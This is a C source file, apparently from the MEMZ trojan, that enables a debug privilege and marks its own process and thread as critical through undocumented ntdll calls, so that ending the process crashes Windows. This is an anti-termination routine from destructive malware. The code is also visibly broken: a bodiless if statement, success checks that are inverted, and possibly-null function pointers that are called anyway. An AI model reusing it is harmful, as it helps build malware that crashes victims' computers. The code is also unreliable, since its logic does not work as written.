#include "../MEMZ.h"

int SetPrivilege(LPCSTR lpPrivilegeName, WINBOOL fEnable)
{
	HANDLE hToken; 
	TOKEN_PRIVILEGES NewState; 
	LUID luidPrivilegeLUID; 

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		return 1; 
	} 
	
	
	if (!fEnable)
	{
		if(!AdjustTokenPrivileges(hToken, 0, NULL, NULL, NULL, NULL))
		{
			return 1;
		}
		else return 1;
	}

	LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeLUID);
	
	NewState.PrivilegeCount = 1; 
	NewState.Privileges[0].Luid = luidPrivilegeLUID; 
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 

	if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))
	{
		return 1;
	}
	
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return 1;
	} 

	return 0;
}
int InitNtSet(){
	int bSuccess = SetPrivilege(SE_DEBUG_NAME, 0);
	if (!bSuccess) return 1;
	return 0;
}
int NoClose(int t){
	HMODULE hDll = GetModuleHandle("ntdll.dll");
	if(hDll == NULL) {
		return 1;
	} 
	
	FARPROC RtlSetProcessIsCritical = GetProcAddress(hDll, "RtlSetProcessIsCritical");
	FARPROC RtlSetThreadIsCritical = GetProcAddress(hDll, "RtlSetThreadIsCritical");
	
	if(RtlSetProcessIsCritical == NULL && RtlSetThreadIsCritical == NULL)
	
	if (!InitNtSet()) return 1;
	
	((void(*)(int, int, int))RtlSetProcessIsCritical)(t, NULL, 1);
	((void(*)(int, int, int))RtlSetThreadIsCritical)(t, NULL, 1);
	if (!t) SetPrivilege(NULL, 1);
	
	return 0;
}